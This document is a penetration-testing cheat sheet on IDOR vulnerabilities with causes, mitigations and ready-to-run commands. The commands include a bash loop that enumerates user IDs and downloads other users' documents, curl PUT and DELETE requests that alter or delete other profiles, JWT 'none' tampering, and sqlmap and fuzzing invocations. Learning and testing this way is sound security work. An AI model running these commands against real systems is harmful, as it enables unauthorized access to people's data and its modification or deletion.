# Insecure Direct Object References (IDOR)

## 1. Introduction to IDOR

IDOR occurs when an application exposes direct references to internal objects (files, records, IDs) that users can modify to access unauthorized data.

**Causes:**
- Missing or weak server-side access controls  
- Overreliance on client-side enforcement  
- Insecure API endpoints that do not validate permissions  

**Impact:**
- Unauthorized data access  
- Account takeover  
- Data modification or deletion  
- Business logic abuse  

---

## 2. Identifying IDOR Vulnerabilities

### Manual Parameter Manipulation

```bash
curl "http://target.com/documents.php?uid=2"
curl "http://target.com/documents.php?uid=3"
```

### Mass Enumeration

```bash
curl -s "http://target.com/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
```

### Automated Enumeration (Bash)

```bash
#!/bin/bash
url="http://target.com"
for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
        wget -q "$url$link"
    done
done
```

Run:

```bash
bash your_script_name.sh
```

---

## 3. Bypassing Encoded Object References

### Base64 Decode

```bash
echo "MTIzNDU=" | base64 -d
```

### Hex Decode

```bash
echo "3132333435" | xxd -r -p
```

### MD5 Hash Check

```bash
echo -n "1" | md5sum | awk '{print $1}'
```

### JWT Tampering

```bash
jwt_tool "<JWT_TOKEN>" -d -S none
```

---

## 4. IDOR in APIs

### Insecure GET

```bash
curl "http://target.com/profile/api.php/profile/2"
```

### Insecure PUT

```bash
curl -X PUT -H "Content-Type: application/json" -d '{"uid":2,"full_name":"New Name"}' "http://target.com/profile/api.php/profile/2"
```

### Insecure DELETE

```bash
curl -X DELETE "http://target.com/profile/api.php/profile/11"
```

---

## 5. IDOR in Mobile Apps

Tools such as MobSF and Frida help inspect and intercept API calls.

```bash
frida -U -n target_app -e "Interceptor.attach(Module.findExportByName(null,'sendRequest'),{onEnter:function(args){console.log('Request:',Memory.readUtf8String(args[1]));}});"
```

---

## 6. Tools for IDOR Testing

### Burp Suite

* Intruder
* Repeater
* Comparer

### ZAP Fuzzer

### SQLMap

```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

### Nmap

```bash
nmap -sV -sC target.com
```

### Gobuster

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

### wfuzz

```bash
wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ
```

### Netcat (manual testing)

```bash
nc -nv target.com 80
GET /documents.php?uid=2 HTTP/1.1
Host: target.com
```

### ffuf

```bash
ffuf -w wordlist.txt -u http://target.com/api/user/ -X GET -H "Authorization: Bearer TOKEN"
```

### Arjun

```bash
python3 arjun.py -u "http://target.com/api/profile"
```

---

## 7. Mitigation

* Enforce strict server-side authorization
* Use UUIDs instead of incremental identifiers
* Never trust client-side validation
* Deploy WAF rules against parameter tampering
* Log and rate-limit suspicious requests
* Conduct regular penetration tests
